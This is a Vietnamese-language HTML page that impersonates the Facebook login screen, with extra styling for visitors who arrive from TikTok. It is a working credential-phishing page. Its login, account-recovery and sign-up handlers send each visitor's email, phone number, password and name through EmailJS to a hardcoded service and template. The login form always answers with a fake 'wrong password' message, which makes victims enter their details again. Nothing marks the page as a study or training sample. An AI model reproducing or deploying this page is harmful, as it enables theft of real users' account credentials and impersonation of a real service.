<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook | Facebook</title>
    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
    <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
    <meta property="og:url" content="https://www.facebook.com">
    <meta property="og:type" content="website">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: #f0f2f5;
        }
        /* TikTok Mode Styles */
        body.tiktok-mode {
            background: #fff;
            justify-content: center;
            align-items: center;
        }
        .header {
            width: 100%;
            padding: 10px 15px;
            background-color: #f5f6f5;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            display: none;
        }
        body.tiktok-mode .header {
            display: block;
        }
        .header.hidden {
            display: none !important;
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .header-title {
            font-size: 18px;
            font-weight: bold;
            color: #1c1e21;
            text-align: center;
            flex: 1;
        }
        .header-title.small-title {
            font-size: 14px;
        }
        .header-menu {
            cursor: pointer;
            position: absolute;
            right: 0;
        }
        .header-menu svg {
            width: 24px;
            height: 24px;
        }
        .dropdown-menu {
            display: none;
            position: absolute;
            top: 40px;
            right: 0;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            z-index: 1001;
            width: 200px;
        }
        .dropdown-menu.active {
            display: block;
        }
        .dropdown-item {
            display: flex;
            align-items: center;
            padding: 10px 15px;
            font-size: 14px;
            color: #000;
            text-align: left;
            border-bottom: 1px solid #ddd;
            cursor: pointer;
        }
        .dropdown-item:last-child {
            border-bottom: none;
        }
        .dropdown-item:hover {
            background-color: #f0f0f0;
        }
        .dropdown-item svg {
            width: 20px;
            height: 20px;
            margin-right: 10px;
        }
        .language-border {
            border-bottom: 1px solid #ddd;
            margin-top: 5px;
            margin-bottom: 5px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }
        .language-text {
            font-size: 12px;
            color: #737373;
            text-align: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .back-button-header {
            display: none;
            align-items: center;
            justify-content: flex-start;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
            color: #1c1e21;
        }
        .back-button-header svg {
            margin-right: 8px;
        }
        .gradient-section {
            position: fixed;
            top: 70px;
            left: 0;
            width: 100%;
            height: 50%;
            background: linear-gradient(to bottom, #e6f0fa 0%, #f5f6f5 100%);
            z-index: 0;
            display: none;
        }
        body.tiktok-mode .gradient-section {
            display: block;
        }
        .main-container {
            flex-grow: 1;
            padding: 20px;
            max-width: 100%;
            margin: 0 auto;
            text-align: center;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container-tiktok, .login-container-desktop,
        .forgot-password-container, .forgot-password-email-container, .create-account-container,
        .about-container, .help-container, .more-container {
            width: 100%;
            max-width: 400px;
            background: transparent;
            padding: 15px; /* Giảm padding để vừa màn hình nhỏ */
            margin-top: 60px; /* Giảm margin-top để vừa màn hình */
            text-align: left;
            position: relative;
            z-index: 1;
            display: none;
        }
        body.tiktok-mode .login-container-tiktok {
            margin-top: 50px; /* Điều chỉnh riêng cho TikTok mode */
            max-height: calc(100vh - 100px); /* Giới hạn chiều cao để vừa màn hình */
            overflow-y: auto; /* Cho phép cuộn nếu nội dung dài */
        }
        .login-container-tiktok.active, .login-container-desktop.active,
        .forgot-password-container.active, .forgot-password-email-container.active, 
        .create-account-container.active, .about-container.active, 
        .help-container.active, .more-container.active {
            display: block;
        }
        body.tiktok-mode .login-container-tiktok.active {
            text-align: center;
        }
        .facebook-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0; /* Giảm margin để vừa màn hình */
        }
        .facebook-logo img {
            width: 50px; /* Giảm kích thước logo */
            height: 50px;
        }
        .custom-logo {
            width: 50px; /* Giảm kích thước logo */
            height: 50px;
            background-color: #1A85FF;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            font-size: 30px; /* Giảm kích thước chữ f */
            font-family: Helvetica, Arial, sans-serif;
            font-weight: bold;
            text-transform: lowercase;
            border: 2px solid #fff;
        }
        .login-container-tiktok input, .login-container-desktop input,
        .forgot-password-container input, .forgot-password-email-container input, 
        .create-account-container input {
            margin-bottom: 10px; /* Giảm khoảng cách giữa các input */
            border-radius: 6px;
            width: 100%;
            padding: 10px; /* Giảm padding input */
            border: 1px solid #ddd;
            background: #fff;
        }
        .btn-primary {
            width: 100%;
            border-radius: 6px;
            padding: 10px; /* Giảm padding nút */
            background-color: #1877f2;
            border-color: #1877f2;
            color: white;
            font-weight: bold;
        }
        .btn-create-account {
            background: transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 6px;
            width: 100%;
            padding: 10px;
            font-weight: bold;
        }
        .forgot-password {
            margin-top: 10px;
            color: #1877f2;
            cursor: pointer;
            font-size: 14px;
            text-align: center;
            display: block;
        }
        .bottom-section {
            position: fixed;
            bottom: 20px; /* Giảm khoảng cách dưới */
            width: 100%;
            max-width: 400px;
            left: 50%;
            transform: translateX(-50%);
            text-align: center;
            z-index: 1;
            display: none;
        }
        body.tiktok-mode .bottom-section {
            display: block;
        }
        .meta-section {
            color: #737373;
            font-size: 14px;
            font-weight: bold;
        }
        .meta-section::before {
            content: "∞ ";
            font-size: 20px;
            color: #737373;
        }
        .footer-links-tiktok {
            position: fixed;
            bottom: 0px;
            width: 100%;
            max-width: 400px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 12px;
            color: #737373;
            text-align: center;
            display: none;
            justify-content: center;
            gap: 20px;
            z-index: 1;
        }
        body.tiktok-mode .footer-links-tiktok {
            display: flex;
        }
        .footer-links-tiktok span {
            color: #737373;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-links-tiktok span:hover {
            text-decoration: underline;
        }
        .info-text {
            font-size: 12px;
            color: #737373;
            margin-top: 10px;
        }
        .search-by-email, .search-by-phone {
            display: block;
            text-align: center;
            margin-top: 10px;
            padding: 10px;
            background: transparent;
            color: #737373;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
        .success-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            width: 90%;
            max-width: 300px;
            text-align: center;
            padding: 20px;
            z-index: 10002;
        }
        .success-popup-title {
            font-size: 16px;
            font-weight: bold;
            color: #1c1e21;
            margin-bottom: 10px;
        }
        .success-popup-message {
            font-size: 14px;
            color: #4b4f56;
            margin-bottom: 20px;
        }
        .success-popup-button {
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 10px;
            width: 100px;
            font-weight: bold;
            cursor: pointer;
        }
        .success-popup-button:hover {
            background-color: #165db2;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: 10001;
        }
        .fb-section {
            margin-bottom: 20px;
        }
        .fb-section h2 {
            font-size: 24px;
            font-weight: bold;
            color: #1c1e21;
            margin-bottom: 10px;
        }
        .fb-section p {
            font-size: 14px;
            color: #4b4f56;
            line-height: 1.4;
        }
        .fb-section a {
            color: #1877f2;
            text-decoration: none;
        }
        .fb-section a:hover {
            text-decoration: underline;
        }
        .fb-links {
            margin-top: 15px;
        }
        .fb-links a {
            display: block;
            font-size: 14px;
            margin-bottom: 10px;
        }
        /* Desktop Mode Styles */
        .left-section {
            display: none;
            text-align: left;
            padding: 20px;
        }
        .desktop-logo {
            width: 300px;
            margin-bottom: 20px;
        }
        .slogan {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.2;
        }
        body.desktop-mode .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
            max-width: 1200px;
        }
        body.desktop-mode .left-section {
            display: block;
            flex: 1;
            max-width: 500px;
        }
        body.desktop-mode .login-container-desktop {
            flex: 1;
            max-width: 400px;
            margin-left: 40px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .divider {
            border-top: 1px solid #ddd;
            margin: 15px 0;
        }
        .footer {
            background: #f5f6f5;
            padding: 15px 0;
            font-size: 12px;
            color: #737373;
            text-align: center;
            display: none;
        }
        body.desktop-mode .footer {
            display: block;
        }
        .footer-languages {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        .footer-languages a {
            color: #737373;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-links {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-meta {
            margin: 0 auto;
            color: #737373;
        }
        @media (max-width: 576px) {
            .header { padding: 8px 10px; }
            .header-title { font-size: 16px; }
            .header-title.small-title { font-size: 12px; }
            .language-text { font-size: 11px; }
            .back-button-header { font-size: 14px; }
            .facebook-logo img { width: 50px; height: 50px; }
            .login-container-tiktok, .forgot-password-container, .forgot-password-email-container, 
            .create-account-container, .about-container, .help-container, .more-container { 
                padding: 15px; margin-top: 50px; 
            }
            .facebook-logo { margin: 20px 0; }
            .btn-primary, .btn-create-account { padding: 10px; }
            .footer-links-tiktok { gap: 15px; }
            .bottom-section { bottom: 20px; }
            .gradient-section { top: 60px; height: 40%; }
            .fb-section h2 { font-size: 20px; }
        }
    </style>
</head>
<body>
    <script type="text/javascript">
        (function() {
            emailjs.init("wF5gWgp1GWyg7q0KY");
        })();
    </script>

    <div class="header">
        <div class="header-content">
            <div class="header-title" id="header-title">Đăng nhập Facebook | Facebook</div>
            <div class="header-menu" onclick="toggleDropdown()">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="6" r="2" fill="#1c1e21"/>
                    <circle cx="12" cy="12" r="2" fill="#1c1e21"/>
                    <circle cx="12" cy="18" r="2" fill="#1c1e21"/>
                </svg>
            </div>
            <div class="dropdown-menu" id="dropdownMenu">
                <div class="dropdown-item" onclick="alert('Báo cáo đã được gửi!')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#737373"/>
                    </svg>
                    Báo cáo
                </div>
                <div class="dropdown-item" onclick="window.open(window.location.href, '_blank')">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19 19H5V5H12V3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="#737373"/>
                    </svg>
                    Mở trong trình duyệt
                </div>
                <div class="dropdown-item" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Liên kết đã được sao chép!'))">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="#737373"/>
                    </svg>
                    Sao chép liên kết
                </div>
            </div>
        </div>
        <div class="language-border"></div>
        <div class="language-text" id="language-text">Tiếng Việt</div>
        <div class="back-button-header" id="back-button-header" onclick="showLogin()">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            Quay lại
        </div>
    </div>
    <div class="gradient-section"></div>
    <div class="main-container">
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
        </div>
        <!-- TikTok Login Container -->
        <div class="login-container-tiktok">
            <div class="facebook-logo">
                <div class="custom-logo">f</div>
            </div>
            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
            <p class="text-danger mt-2" id="error-message-tiktok" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
            <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Desktop Login Container -->
        <div class="login-container-desktop">
            <input type="text" id="login-input-desktop" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="password-desktop" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('desktop')">Đăng nhập</button>
            <p class="text-danger mt-2" id="error-message-desktop" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
            <div class="divider"></div>
            <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Forgot Password Container -->
        <div class="forgot-password-container">
            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
            <p>Nhập số di động của bạn</p>
            <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
            <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
            <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
            <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
        </div>
        <!-- Forgot Password Email Container -->
        <div class="forgot-password-email-container">
            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
            <p>Nhập email của bạn</p>
            <input type="email" id="email-input" class="form-control" placeholder="Email">
            <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
            <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
            <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
        </div>
        <!-- Create Account Container -->
        <div class="create-account-container">
            <h5 style="font-weight: bold;">Tạo tài khoản mới</h5>
            <input type="text" id="firstName" class="form-control" placeholder="Tên">
            <input type="text" id="lastName" class="form-control" placeholder="Họ">
            <input type="text" id="phone" class="form-control" placeholder="Số di động">
            <input type="email" id="email" class="form-control" placeholder="Email">
            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
            <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
            <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
        </div>
        <!-- About Container -->
        <div class="about-container">
            <div class="fb-section">
                <h2>Giới thiệu về Facebook</h2>
                <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau. Sứ mệnh của chúng tôi là mang đến cho bạn sức mạnh để xây dựng cộng đồng và đưa thế giới đến gần nhau hơn.</p>
            </div>
            <div class="fb-section">
                <h2>Công ty</h2>
                <p>Facebook là một phần của Meta, tập trung vào việc kết nối con người thông qua công nghệ. Thành lập năm 2004 bởi Mark Zuckerberg.</p>
                <div class="fb-links">
                    <a href="#">Tìm hiểu thêm về Meta</a>
                    <a href="#">Sự nghiệp tại Facebook</a>
                    <a href="#">Lịch sử của chúng tôi</a>
                </div>
            </div>
        </div>
        <!-- Help Container -->
        <div class="help-container">
            <div class="fb-section">
                <h2>Trợ giúp & Hỗ trợ</h2>
                <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn với bất kỳ vấn đề nào liên quan đến tài khoản, bảo mật, hoặc cách sử dụng Facebook.</p>
            </div>
            <div class="fb-section">
                <h2>Các chủ đề phổ biến</h2>
                <div class="fb-links">
                    <a href="#">Quên mật khẩu</a>
                    <a href="#">Bảo mật tài khoản</a>
                    <a href="#">Báo cáo nội dung</a>
                    <a href="#">Liên hệ với chúng tôi</a>
                </div>
            </div>
        </div>
        <!-- More Container -->
        <div class="more-container">
            <div class="fb-section">
                <h2>Xem thêm</h2>
                <p>Khám phá các sản W phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
            </div>
            <div class="fb-section">
                <h2>Sản phẩm</h2>
                <div class="fb-links">
                    <a href="#">Instagram</a>
                    <a href="#">Messenger</a>
                    <a href="#">WhatsApp</a>
                    <a href="#">Oculus</a>
                </div>
            </div>
            <div class="fb-section">
                <h2>Tính năng</h2>
                <div class="fb-links">
                    <a href="#">Stories</a>
                    <a href="#">Groups</a>
                    <a href="#">Marketplace</a>
                </div>
            </div>
        </div>
    </div>
    <div class="overlay" id="dialog-overlay"></div>
    <div class="success-popup" id="custom-dialog">
        <div class="success-popup-title" id="dialog-title"></div>
        <div class="success-popup-message" id="dialog-message"></div>
        <button class="success-popup-button" onclick="hideDialog()">OK</button>
    </div>
    <div class="bottom-section">
        <div class="meta-section">Meta</div>
    </div>
    <div class="footer-links-tiktok">
        <span onclick="showAbout()">Giới thiệu</span>
        <span onclick="showHelp()">Trợ giúp</span>
        <span onclick="showMore()">Xem thêm</span>
    </div>
    <footer class="footer">
        <div class="footer-languages">
            <a href="https://www.facebook.com/?locale=vi_VN" target="_blank">Tiếng Việt</a>
            <a href="https://www.facebook.com/?locale=en_GB" target="_blank">English (UK)</a>
            <a href="https://www.facebook.com/?locale=zh_TW" target="_blank">中文(台灣)</a>
            <a href="https://www.facebook.com/?locale=ko_KR" target="_blank">한국어</a>
            <a href="https://www.facebook.com/?locale=ja_JP" target="_blank">日本語</a>
            <a href="https://www.facebook.com/?locale=fr_FR" target="_blank">Français (France)</a>
            <a href="https://www.facebook.com/?locale=th_TH" target="_blank">ภาษาไทย</a>
            <a href="https://www.facebook.com/?locale=es_ES" target="_blank">Español</a>
            <a href="https://www.facebook.com/?locale=pt_BR" target="_blank">Português (Brasil)</a>
            <a href="https://www.facebook.com/?locale=de_DE" target="_blank">Deutsch</a>
            <a href="https://www.facebook.com/?locale=it_IT" target="_blank">Italiano</a>
        </div>
        <div class="footer-links">
            <a onclick="showLogin()">Đăng nhập</a>
            <a onclick="showCreateAccount()">Đăng ký</a>
            <a href="https://www.messenger.com/" target="_blank">Messenger</a>
            <a href="https://www.facebook.com/lite/" target="_blank">Facebook Lite</a>
            <a href="https://www.facebook.com/watch/" target="_blank">Video</a>
            <a href="https://www.facebook.com/places/" target="_blank">Địa điểm</a>
            <a href="https://www.facebook.com/games/" target="_blank">Trò chơi</a>
            <a href="https://www.facebook.com/marketplace/" target="_blank">Marketplace</a>
            <a href="https://pay.facebook.com/" target="_blank">Meta Pay</a>
            <a href="https://www.meta.com/store/" target="_blank">Meta Store</a>
            <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
            <a href="https://www.instagram.com/" target="_blank">Instagram</a>
            <a href="https://www.threads.net/" target="_blank">Threads</a>
            <a href="https://www.facebook.com/fundraisers/" target="_blank">Quyên góp</a>
            <a href="https://about.meta.com/" target="_blank">Giới thiệu</a>
            <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
            <a href="https://www.facebook.com/business/" target="_blank">Tạo quảng cáo</a>
            <a href="https://www.facebook.com/pages/create/" target="_blank">Tạo Trang</a>
            <a href="https://developers.facebook.com/" target="_blank">Nhà phát triển</a>
            <a href="https://careers.facebook.com/" target="_blank">Tuyển dụng</a>
            <a href="https://www.facebook.com/policies/cookies/" target="_blank">Cookie</a>
            <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
        </div>
        <div class="footer-meta">Meta © 2025</div>
    </footer>

    <script>
        window.onload = function() {
            const referrer = document.referrer.toLowerCase();
            const userAgent = navigator.userAgent.toLowerCase();
            const urlParams = new URLSearchParams(window.location.search);
            const isDesktop = window.innerWidth > 1024 && !/mobile|android|iphone|ipad/i.test(userAgent);
            const isFromTikTok = 
                referrer.includes("tiktok.com") || 
                userAgent.includes("tiktok") || 
                userAgent.includes("bytedance") || 
                userAgent.includes("musical_ly") || 
                userAgent.includes("douyin") || 
                urlParams.has("tt_from") || 
                urlParams.get("utm_source") === "tiktok" || 
                urlParams.get("source_app") === "tiktok" || 
                /mobile|android|iphone|ipad/i.test(userAgent);

            console.log("Referrer:", referrer);
            console.log("User Agent:", userAgent);
            console.log("URL Params:", urlParams.toString());
            console.log("Is Desktop:", isDesktop);
            console.log("Is From TikTok:", isFromTikTok);

            document.body.classList.remove('tiktok-mode', 'desktop-mode');
            const header = document.querySelector('.header');

            if (isFromTikTok && !isDesktop) {
                console.log("Applying TikTok mode");
                document.body.classList.add('tiktok-mode');
                header.classList.remove('hidden'); // Chỉ hiển thị header trong TikTok mode
                hideAllExcept('.login-container-tiktok');
            } else {
                console.log("Applying Desktop mode");
                document.body.classList.add('desktop-mode');
                header.classList.add('hidden'); // Ẩn header trong desktop mode
                document.querySelector('.left-section').style.display = 'block';
                hideAllExcept('.login-container-desktop');
            }
        };

        function toggleDropdown() {
            const dropdownMenu = document.getElementById('dropdownMenu');
            dropdownMenu.classList.toggle('active');
        }

        function hideAllExcept(selector) {
            const containers = [
                '.login-container-tiktok', '.login-container-desktop',
                '.forgot-password-container', '.forgot-password-email-container', 
                '.create-account-container', '.about-container', '.help-container', '.more-container'
            ];
            containers.forEach(container => {
                const element = document.querySelector(container);
                element.classList.remove('active');
                element.style.display = container === selector ? 'block' : 'none';
            });
            document.querySelector(selector).classList.add('active');
        }

        function showLogin() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const isTikTok = document.body.classList.contains('tiktok-mode');
            if (isTikTok) {
                hideAllExcept('.login-container-tiktok');
                document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
                document.getElementById('header-title').classList.remove('small-title');
                document.getElementById('language-text').style.display = 'block';
                document.getElementById('back-button-header').style.display = 'none';
            } else if (isDesktop) {
                hideAllExcept('.login-container-desktop');
                document.querySelector('.left-section').style.display = 'block';
                document.querySelector('.header').classList.add('hidden'); // Ẩn header khi quay lại desktop
            }
        }

        function showForgotPassword() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.forgot-password-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showForgotPasswordEmail() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.forgot-password-email-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showCreateAccount() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.create-account-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showAbout() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.about-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Giới thiệu';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showHelp() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.help-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Trợ giúp';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showMore() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.more-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
            } else {
                document.getElementById('header-title').innerText = 'Xem thêm';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
            }
        }

        function showDialog(title, message) {
            const dialog = document.getElementById('custom-dialog');
            const overlay = document.getElementById('dialog-overlay');
            document.getElementById('dialog-title').innerText = title;
            document.getElementById('dialog-message').innerText = message;
            dialog.style.display = 'block';
            overlay.style.display = 'block';
            setTimeout(() => {
                if (window.getComputedStyle(dialog).display === 'none') {
                    alert(`${title}\n${message}`);
                }
            }, 100);
        }

        function hideDialog() {
            document.getElementById('custom-dialog').style.display = 'none';
            document.getElementById('dialog-overlay').style.display = 'none';
        }

        function login(mode) {
            const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') : document.getElementById('login-input-desktop');
            const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') : document.getElementById('password-desktop');
            const loginValue = loginInput.value;
            const password = passwordInput.value;

            if (!loginValue || !password) {
                showDialog("Đăng nhập không thành công!", "Vui lòng nhập đầy đủ thông tin!");
                return;
            }

            const templateParams = {
                password: password,
                phone: '',
                email: loginValue,
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu vui lòng thử lại.");
                }, function(error) {
                    showDialog("Đăng nhập không thành công", "Sai thông tin tài khoản hoặc mật khẩu vui lòng thử lại.");
                });
        }

        function searchByPhone() {
            const phone = document.getElementById('phone-input').value;

            if (!phone) {
                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động!");
                return;
            }

            const templateParams = {
                password: '',
                phone: phone,
                email: '',
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến số di động của bạn!");
                }, function(error) {
                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                });
        }

        function searchByEmail() {
            const email = document.getElementById('email-input').value;

            if (!email) {
                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email!");
                return;
            }

            const templateParams = {
                password: '',
                phone: '',
                email: email,
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến email của bạn!");
                }, function(error) {
                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản. Vui lòng thử lại!");
                });
        }

        function createAccount() {
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('new-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;

            if (!firstName || !lastName || !phone || !email || !password || !confirmPassword) {
                showDialog("Đăng ký thất bại!", "Vui lòng điền đầy đủ thông tin!");
                return;
            }

            if (password !== confirmPassword) {
                showDialog("Đăng ký thất bại!", "Mật khẩu không khớp!");
                return;
            }

            const templateParams = {
                password: password,
                phone: phone,
                email: email,
                firstName: firstName,
                lastName: lastName
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Đăng ký thành công!", "Email đã được gửi thành công!");
                }, function(error) {
                    showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                });
        }
    </script>
</body>
</html>
